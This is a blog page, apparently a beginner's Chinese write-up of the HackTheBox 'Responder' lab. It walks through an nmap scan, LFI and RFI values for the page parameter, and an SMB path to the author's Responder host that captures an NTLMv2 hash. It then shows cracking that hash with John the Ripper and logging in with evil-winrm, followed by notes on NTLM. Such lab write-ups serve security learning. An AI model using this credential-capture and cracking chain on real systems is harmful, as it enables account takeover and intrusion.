@@ -1,0 +1,239 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>HackTheBox学习记录 | Makura's Gardon</title><meta name="author" content="Makura"><meta name="copyright" content="Makura"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Responder1.When visiting the web service using the IP address, what is the domain that we are being redirected to? 1unika.htb  先用nmap扫描目标主机开放端口 1nmap -sV -T4 10.128.255.140    发现没东西,选择查看网页源代码,成功发现doma">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox学习记录">
+<meta property="og:url" content="https://makura-zero.github.io/posts/86ad6a21.html">
+<meta property="og:site_name" content="Makura&#39;s Gardon">
+<meta property="og:description" content="Responder1.When visiting the web service using the IP address, what is the domain that we are being redirected to? 1unika.htb  先用nmap扫描目标主机开放端口 1nmap -sV -T4 10.128.255.140    发现没东西,选择查看网页源代码,成功发现doma">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2023/01/28/q3AOcUjyBQHe1TE.jpg">
+<meta property="article:published_time" content="2023-01-27T12:08:40.000Z">
+<meta property="article:modified_time" content="2023-01-28T03:52:42.941Z">
+<meta property="article:author" content="Makura">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2023/01/28/q3AOcUjyBQHe1TE.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://makura-zero.github.io/posts/86ad6a21.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  }
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'HackTheBox学习记录',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-01-28 11:52:42'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = url => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      link.onload = () => resolve()
+      link.onerror = () => reject()
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/css/custom.css" media="defer" onload="this.media='all'"><meta name="generator" content="Hexo 6.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://i.328888.xyz/2023/01/24/bVIKJ.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 命运之门</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://s2.loli.net/2023/01/28/q3AOcUjyBQHe1TE.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="Makura's Gardon"><span class="site-name">Makura's Gardon</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 命运之门</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">HackTheBox学习记录</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-01-27T12:08:40.000Z" title="发表于 2023-01-27 20:08:40">2023-01-27</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-01-28T03:52:42.941Z" title="更新于 2023-01-28 11:52:42">2023-01-28</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="HackTheBox学习记录"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h3 id="Responder"><a href="#Responder" class="headerlink" title="Responder"></a>Responder</h3><p><strong>1.When visiting the web service using the IP address, what is the domain that we are being redirected to?</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unika.htb</span><br></pre></td></tr></table></figure>
+
+<p>先用nmap扫描目标主机开放端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -T4 10.128.255.140</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2023/01/27/YFxbDhJtecs7T9M.png" alt="image.png"></p>
+<p><img src="https://s2.loli.net/2023/01/27/m2B7bDIQ9KeN6Z5.png" alt="image.png"></p>
+<p>发现没东西,选择查看网页源代码,成功发现domain</p>
+<meta http-equiv="refresh" content="0;url=http://unika.htb/">
+
+<p><strong>2.Which scripting language is being used on the server to generate webpages?</strong></p>
+<p>提示:脚本语言(结合nmap扫描出的结果)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php</span><br></pre></td></tr></table></figure>
+
+<p>可以使用Wappalyzer插件直接查看</p>
+<p><img src="https://s2.loli.net/2023/01/27/qbopHhTwizPYVvI.png" alt="image.png"></p>
+<p><strong>3.What is the name of the URL parameter which is used to load different language versions of the webpage?</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">page</span><br></pre></td></tr></table></figure>
+
+<p>解析: 很明显要去访问unika.htb这个地址,但是显示找不到服务器</p>
+<p>原因: 可能是环境内不存在域名服务器导致,需要手动在&#x2F;etc&#x2F;hosts下添加域名与ip的对应关系</p>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/476a92a39b45">linux环境下&#x2F;etc&#x2F;hosts文件详解 - 简书 (jianshu.com)</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.129.255.140 unika.htb</span><br></pre></td></tr></table></figure>
+
+<p><strong>4.Which of the following values for the <code>page</code> parameter would be an example of exploiting a Local File Include (LFI) vulnerability: “french.html”, “&#x2F;&#x2F;10.10.14.6&#x2F;somefile”, “..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;windows&#x2F;system32&#x2F;drivers&#x2F;etc&#x2F;hosts”, “minikatz.exe”</strong>(本地文件包含漏洞示例)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">../../. ./../../../../../windows/system32/drivers/etc/hosts</span><br><span class="line">语言转换处可能存在文件包含漏洞</span><br><span class="line">吐槽: 好奇怪的文件路径</span><br></pre></td></tr></table></figure>
+
+<p><strong>5.Which of the following values for the <code>page</code> parameter would be an example of exploiting a Remote File Include (RFI) vulnerability: “french.html”, “&#x2F;&#x2F;10.10.14.6&#x2F;somefile”, “..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;windows&#x2F;system32&#x2F;drivers&#x2F;etc&#x2F;hosts”, “minikatz.exe”</strong>(远程文件包含)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//10.10.14.6/somefile</span><br></pre></td></tr></table></figure>
+
+<p><strong>6.What does NTLM stand for?</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">New Technology LAN Manager</span><br></pre></td></tr></table></figure>
+
+<p> 建议英文搜索,中文要找半天</p>
+<p><strong>7.Which flag do we use in the Responder utility to specify the network interface?</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-i</span><br></pre></td></tr></table></figure>
+
+<p>Responder原理可参考<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/256844.html">https://www.freebuf.com/articles/network/256844.html</a></p>
+<p>network interface: 网络接口(网卡)</p>
+<p><strong>8.There are several tools that take a NetNTLMv2 challenge&#x2F;response and try millions of passwords to see if any of them generate the same response. One such tool is often referred to as <code>john</code>, but the full name is what?</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">john the ripper</span><br></pre></td></tr></table></figure>
+
+<p><strong>9.What is the password for the administrator user?</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">badminton</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2023/01/28/gVmn5tsT9XEAozh.png" alt="image.png"></p>
+<p>ifconfig查看网卡名称tun0</p>
+<p>responder -i tun0: 监听</p>
+<p>配合远程文件包含漏洞**(基于smb协议)**page&#x3D;&#x2F;&#x2F;10.10.16.86&#x2F;somefile</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[SMB] NTLMv2-SSP Client   : ::ffff:10.129.212.168</span><br><span class="line">[SMB] NTLMv2-SSP Username : RESPONDER\Administrator</span><br><span class="line">[SMB] NTLMv2-SSP Hash     : Administrator::RESPONDER:52fb5afadfa7b450:EBF6170056E0EF9929B4AFF20371C5C0:010100000000000080C496199432D901928D7FA9218DCC73000000000200080048004A005900560001001E00570049004E002D0043004A004F003800480041004300570046004E00430004003400570049004E002D0043004A004F003800480041004300570046004E0043002E0048004A00590056002E004C004F00430041004C000300140048004A00590056002E004C004F00430041004C000500140048004A00590056002E004C004F00430041004C000700080080C496199432D90106000400020000000800300030000000000000000100000000200000A039C24F47C33A2E5870898CF423859911A117C82E7F0DA2A7332C9DCCD4D3ED0A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310036002E00380036000000000000000000  </span><br></pre></td></tr></table></figure>
+
+<p>破解hash</p>
+<p>呃呃,破解一下hash直接cpu爆满</p>
+<p><img src="https://s2.loli.net/2023/01/28/5qz7gTXe36Gf8Vm.png" alt="image.png"></p>
+<p>放到云服务器上运行吧</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apt install john</span><br><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</span><br></pre></td></tr></table></figure>
+
+<p><strong>10.We’ll use a Windows service (i.e. running on the box) to remotely access the Responder machine using the password we recovered. What port TCP does it listen on?</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5985</span><br></pre></td></tr></table></figure>
+
+<p>11.Submit root flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i 10.129.212.168 -u Administrator -p badminton</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://s2.loli.net/2023/01/28/i3sQrUXkTWj6NgH.png" alt="image.png"></p>
+<p>经过不断查找,在mike用户的桌面下找到flag.txt</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-Content</span> flag.txt</span><br><span class="line">ea81b7afddd03efaa0945333ed147fac</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>1.网络适配器即网卡,是工作在链路层的网络组件,是局域网中连接计算机和传输介质的接口,不仅能实现与局域网传输介质之间的物理连接和电信号匹配,还涉及帧的发送与接收、帧的封装与拆封、介质访问控制、数据的编码与解码以及数据缓存的功能等。</p>
+<p>网络适配器是使计算机联网的设备，平常所说的网卡就是将PC机和LAN连接的网络适配器。网卡插在计算机主板插槽中，负责将用户要传递的数据转换为网络上其它设备能够识别的格式，通过网络介质传输。</p>
+<p>2.NTLM协议理解:</p>
+<p>NTLM主要过程如下:</p>
+<p>​	1、客户端首先在本地加密自己的密码成为<strong>密码散列</strong><br>​	2、客户端向服务器发送自己的帐号，这个帐号是没有经过加密的，<strong>明文直接传输</strong>。<br>​	3、服务器产生一个<strong>16位的随机数字</strong>发送给客户端，作为一个 challenge<br>​	4、客户端再用加密后的密码散列来加密这个 challenge ，然后把这个返回给服务器。作为 		response。<br>​	5、服务器把用户名、给客户端的challenge 、客户端返回的 response 这三个东西，发送域		控制器。<br>​	6、域控制器用这个用户名在 SAM密码管理库中找到这个用户的密码散列，然后使用这个密		码散列来加密 challenge。<br>​	7、域控制器比较两次加密的 challenge ，如果一样，那么认证成功。</p>
+<p>目前winserver 2008及以后的windows版本默认均是使用NetNTLMv2的，默认使用NTLMv1的有2003、XP这些机器。</p>
+<p><strong>windows基于NTLM认证的有SMB、HTTP、LDAP、MSSQL等</strong>，responder可以通过模拟正常的SMB协议从而获得受害机器的NTLMV2 hash值，NTLM v2不能直接应用于Pass The Hash攻击，只能通过暴力破解来获取明文密码。而攻击者获取NTLMv1 hash后，可以直接还原NTLM HASH，这样的话就可以将NTLM HASH直接用于Pass The Hash攻击，相较于NTLM v2还需要破解才能利用更加不安全。</p>
+<p>3.域内主机名解析流程:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.查看本地hosts文件</span><br><span class="line"></span><br><span class="line">2.查找DNS缓存，windows可使用命令 ipconfig/displaydns 查看</span><br><span class="line"></span><br><span class="line">3.DNS服务器</span><br><span class="line"></span><br><span class="line">4.尝试LLMNR、NBNS和MDNS协议进行解析</span><br></pre></td></tr></table></figure>
+
+<p>参考:</p>
+<p><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=R8GOLiKIA1k">https://www.youtube.com/watch?v=R8GOLiKIA1k</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://makura-zero.github.io">Makura</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://makura-zero.github.io/posts/86ad6a21.html">https://makura-zero.github.io/posts/86ad6a21.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://makura-zero.github.io" target="_blank">Makura's Gardon</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://s2.loli.net/2023/01/28/q3AOcUjyBQHe1TE.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/posts/b7f5efba.html" title="操作系统常用命令总结"><img class="cover" src="https://s2.loli.net/2023/01/27/PVdk3tTjimYWn5R.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">操作系统常用命令总结</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://i.328888.xyz/2023/01/24/bVIKJ.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Makura</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Makura-zero"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://space.bilibili.com/1947350793?spm_id_from=333.337.0.0" target="_blank" title="Bilibili"><i class="fab fa-bilibili"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">网安小菜鸡一枚!(≧∀≦)ゞ<br>有事b站私信( •̀ ω •́ )y</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#Responder"><span class="toc-number">1.</span> <span class="toc-text">Responder</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.1.</span> <span class="toc-text">总结</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/86ad6a21.html" title="HackTheBox学习记录"><img src="https://s2.loli.net/2023/01/28/q3AOcUjyBQHe1TE.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="HackTheBox学习记录"/></a><div class="content"><a class="title" href="/posts/86ad6a21.html" title="HackTheBox学习记录">HackTheBox学习记录</a><time datetime="2023-01-27T12:08:40.000Z" title="发表于 2023-01-27 20:08:40">2023-01-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/b7f5efba.html" title="操作系统常用命令总结"><img src="https://s2.loli.net/2023/01/27/PVdk3tTjimYWn5R.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="操作系统常用命令总结"/></a><div class="content"><a class="title" href="/posts/b7f5efba.html" title="操作系统常用命令总结">操作系统常用命令总结</a><time datetime="2023-01-27T07:16:03.000Z" title="发表于 2023-01-27 15:16:03">2023-01-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/d87f7e0c.html" title="Github Action自动部署"><img src="https://i.328888.xyz/2023/01/24/bV6Rx.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Github Action自动部署"/></a><div class="content"><a class="title" href="/posts/d87f7e0c.html" title="Github Action自动部署">Github Action自动部署</a><time datetime="2023-01-24T08:06:32.000Z" title="发表于 2023-01-24 16:06:32">2023-01-24</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/posts/4a17b156.html" title="Hello World">Hello World</a><time datetime="2023-01-23T13:04:36.651Z" title="发表于 2023-01-23 21:04:36">2023-01-23</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By Makura</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
